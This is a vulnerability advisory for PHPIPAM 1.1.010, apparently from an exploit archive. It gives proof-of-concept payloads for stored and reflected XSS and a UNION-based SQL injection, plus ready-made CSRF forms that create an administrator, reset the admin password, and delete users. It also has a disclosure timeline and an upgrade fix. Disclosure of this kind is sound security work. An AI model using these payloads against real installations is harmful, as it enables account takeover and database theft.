@@ -1,0 +1,227 @@
+######################################################################
+# Exploit Title: PHPIPAM v1.1.010 Multiple Vulnerabilities
+# Date: 04/01/2016
+# Author: Mickael Dorigny @ Synetis
+# Vendor or Software Link: http://phpipam.net/
+# Version: 1.1.010
+# Category: Multiple Vulnerabilities
+# Tested on : 1.1.010
+######################################################################
+
+PHPIPAM description :
+======================================================================
+PHPIPAM is an open-source web IP address management application. Its goal is to provide light, modern and useful IP address management. It is php-based application with MySQL database backend, using jQuery libraries, ajax and some HTML5/CSS3 features.
+
+Vulnerabilities description :
+======================================================================
+PHPIPAM version 1.1.010 is vulnerable to multiple vulnerabilities like :
+- Stored XSS without authentication
+- Reflected XSS
+- SQL Injection
+- CSRF
+
+Proof of Concept n°1 -  Stored XSS without authentication :
+================================================================================================
+Through PHPIPAM, external users can try to authenticate on the following page :
+
+http://server/phpipam/?page=login
+
+For each try, even if it's a success or a failure, a line is added in the log register. The admin user can read those logs through the back office. Here is an example of authentication log lines :
+"User Admin1 logged in."
+"User User1 failed to log in."
+
+Here we can see that the username is directly written in logs.
+
+A malicious user can use this log feature to make administrator executes JavaScript instructions in his browser. To do so, an external user can try to inject JavaScript instructions in the "username" field of the authentication form.
+
+PoC :
+
+[REQUEST]
+http://server/phpipam/site/login/loginCheck.php
+[POSTDATA]
+ipamusername=<script>alert("RXSS01")</script>&ipampassword=XXX
+
+With this request, the following line will automatically be added in the "Log Files" section in the admin back office :
+
+<tr class="danger Warning" id="9">
+  <td class="date">2015-12-03 22:28:22</td>
+  <td class="severity"><span>2</span>Warning</td>
+  <td class="username"></td>
+  <td class="ipaddr">192.168.1.47</td>
+  <td class="command"><a href="" class="openLogDetail" data-logid="9">User <script>alert("RXSS01");</script> failed to log in.</a></td>
+  <td class="detailed">  </td>
+</tr>
+
+JavaScript instructions will be executed by admin's browser each time he will consult the Log File section. Additionnally, latest log lines are displayed in the home page of each admin, so JavaScript instructions will be executed at this moment two.
+
+Through this vulnerability, an attacker could tamper with page rendering, redirect victim to fake login page, or capture users credentials such cookies, and especially admin's ones. Moreover, an user without privileges can use this vulnerability to steal Administrator cookie to lead privileges escalation in PHPIPAM.
+
+Proof of Concept n°2 - SQL Injection : 
+================================================================================================
+Once an user or an admin is authenticated, he can makes search through the search bar. This feature can be used to modify SQL query passed by the web application to the database. 
+
+PoC : 
+1" UNION SELECT 1,2,3,4,user(),6,7,8,9,10,11,12,13,14,15#
+
+Note that the search bar in the top right of the web application seems to be protected against this injection. But the "Search IP database" form that is displayed after a first search isn't well protected. Server answer is displayed in table, for the example injection, this is the replied lines : 
+: 
+
+<tr class="subnetSearch" subnetid="1" sectionname="" sectionid="" link="|1">
+  <td></td>
+  <td><a href="?page=subnets&section=4&subnetId=1">0.0.0.2/3</a></td>
+#   <td><a href="?page=subnets&section=4&subnetId=1">root@localhost</a></td>
+   <td>0.0.0.0/</td>
+   <td></td>
+   <td>disabled</td>
+  <td><button class="btn btn-xs btn-default edit_subnet" data-action="edit" data-subnetid="1" data-sectionid="4" href="#" rel="tooltip" data-container="body" title="Edit subnet details"></button></td>
+</tr>
+
+Here, line marked with a "#" correspond to text data in the SQL database so they can display any requested data. Through this vulnerability, an attacker can dump and modify database content.
+
+Proof of Concept n°3 - Reflected Cross-Site Scripting (RXSS) with authentication :
+================================================================================================
+A search form is displayed on every page on the top of each page. When this form is used, users are redirected to a search result page that display another form. Both of these forms are vulnerable to XSS through the following PoC. Several evasion tricks can be used to bypass the initial protection that delete HTML tags.
+
+Note that the initial form on the top of each page is protected from basic XSS by deleting HTML tags.
+
+PoC for the top search form: 
+[REQUEST]
+ABC" onmouseover=alert(1) name="A
+
+This payload will executes javascript instructions when the user will pass his cursor over the new search form that is displayed on the middle of the search result page
+
+PoC for the search form displayed in search result page :
+
+[REQUEST]
+ABC' onmouseover=alert(1) name='A
+
+This payload will executes javascript instruction when the user will pass his cursor over initial search form on top of the page.
+
+Through this vulnerability, an attacker could tamper with page rendering, redirect victim to fake login page, or capture users credentials such cookies, and especially admin's ones. Moreover, an user without privileges can use this vulnerability to steal Administrator cookie to lead privileges escalation in PHPIPAM.
+
+Proof of Concept n°4 - CSRF on user creation :
+================================================================================================
+The user creation form isn't protected against CSRF attack. Consequently, an administrator can be trapped to create an user with administrator permissions by clicking on a malicious link which will make him execute the following request :
+
+PoC : 
+[REQUEST]
+http://server/phpipam/site/admin/usersEditResult.php 
+[POSTDATA]
+real_name=user2&username=user2&email=user2%40user1.fr&role=Administrator&userId=&action=add&domainUser=0&password1=password123&password2=password123&lang=3&notifyUser=on&mailNotify=No&mailChangelog=No&group3=on&group2=on
+
+Here, the user named "user2" will be created with "Administrator" permissions. Here is the used form to generate a request :
+
+<form method=post action=http://server/phpipam/site/admin/usersEditResult.php>
+        <input type=hidden name=real_name value=user123>
+        <input type=hidden name=username value=user123>
+        <input type=hidden name=email value="user123@okok.fr">
+        <input type=hidden name=role value=Administrator><!-- Here, we give Administrator permission -->
+        <input type=hidden name=action value=add><!-- Here, we add a user-->
+        <input type=hidden name=domainUser value=user123>
+        <input type=hidden name=password1 value=password123><!-- > 8 characters-->
+        <input type=hidden name=password2 value=password123><!-- > 8 characters-->
+        <input type=hidden name=lang value=3>
+        <input type=hidden name=notifyUser value=off>
+        <input type=hidden name=mailNotify value=No>
+        <input type=hidden name=mailChangelog value=no>
+        <input type=submit value="Click here, it's awesome !">
+</form>
+
+Proof of Concept n°5 : CSRF on user attributes modification
+================================================================================================
+User modification form isn't protected against CSRF attack. Consequently, a user/admin can be trapped to modify his mail or password  by clicking on a malicious link which will make him execute the following request :
+
+PoC:
+[REQUEST]
+http://server/phpipam/site/admin/usersEditResult.php 
+[DATA]
+POSTDATA=real_name=phpIPAM+Admin&username=Admin&email=admin%40domain.local&role=Administrator&userId=1&action=edit&domainUser=0&password1=password123&password2=password123&lang=1&mailNotify=No&mailChangelog=
+
+Here, the passwordof user named "Admin" will be modified to "password123" and mail will be modified to "admin@domain.local". All other attributes can be modified two. In this context, targeted user is specified with his "userId", we can generally guess that the userId "1" is the first admin of PHP Ipam.
+
+Here is the used form to generate a request :
+<form method=post action=http://server/phpipam/site/admin/usersEditResult.php>
+        <input type=hidden name=real_name value=AdminModified>
+        <input type=hidden name=username value=Admin><!-- we can change username -->
+        <input type=hidden name=userId value=1><!-- This attribute must match with targeted user -->
+        <input type=hidden name=email value="adminmodified@okok.fr"> <!-- we can change affected email-->
+        <input type=hidden name=role value=Administrator><!-- we can change a user permission -->
+        <input type=hidden name=action value=edit><!-- Here, we edit a user-->
+        <input type=hidden name=domainUser value=user123>
+        <input type=hidden name=password1 value=password123><!-- we can change password-->
+        <input type=hidden name=password2 value=password123>
+        <input type=hidden name=lang value=3>
+        <input type=hidden name=notifyUser value=off>
+        <input type=hidden name=mailNotify value=No>
+        <input type=hidden name=mailChangelog value=no>
+        <input type=submit value="Click here, it's awesome !">
+</form>
+
+Proof of Concept n°6 : CSRF on user deletion
+================================================================================================
+User deletion form isn't protected against CSRF attack. Consequently, an admin can be trapped to delete any user by clicking on a malicious link which will make him execute the following request :
+
+[REQUEST]
+http://server/phpipam/site/admin/usersEditPrint.php
+[POSTDATA]
+id=2&action=delete
+
+In this context, targeted user is specified with his "userId".
+
+Here is the used form to generate a request :
+<form method=post action=http://server/phpipam/site/admin/usersEditResult.php>
+        <input type=hidden name=userId value=5>
+        <input type=hidden name=action value=delete>
+        <input type=submit value="Click here, it's awesome !">
+</form>
+
+In this context, targeted user is specified with his "userId".
+
+Screenshots :
+======================================================================
+- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-05.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-06.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-09.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-10.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-11.jpg
+- http://www.information-security.fr/wp-content/uploads/2015/12/php-ipam-multiple-vulnerabilities-03.jpg
+
+Solution: 
+======================================================================
+
+Update your PHPIPAM Installation to version 1.2 :  https://github.com/phpipam/phpipam
+ 
+Additional resources :
+======================================================================
+- http://information-security.fr/en/xss-csrf-sqli-php-ipam-version-1-1-010
+- https://www.youtube.com/watch?v=86dJpyKYag4
+- http://phpipam.net/
+
+Report timeline :
+======================================================================
+2015-12-26 : Editor informed for vulnerabilities
+2015-12-27 : Editor take a look and inform that a version 1.2 exist 
+2016-01-04 : Advisory release
+
+Credits :
+======================================================================
+
+    88888888
+   88      888                                         88    88
+  888       88                                         88
+  788           Z88      88  88.888888     8888888   888888  88    8888888.
+   888888.       88     88   888    Z88   88     88    88    88   88     88
+       8888888    88    88   88      88  88       88   88    88   888
+            888   88   88    88      88  88888888888   88    88     888888
+  88         88    88  8.    88      88  88            88    88          888
+  888       ,88     8I88     88      88   88      88   88    88  .88     .88
+   ?8888888888.     888      88      88    88888888    8888  88   =88888888
+       888.          88
+                    88    www.synetis.com
+                 8888  Consulting firm in management and information security
+ 
+Mickael Dorigny - Security Consultant @ Synetis | Information-Security.fr
+
+--
+SYNETIS 
+CONTACT: www.synetis.com | www.information-security.fr
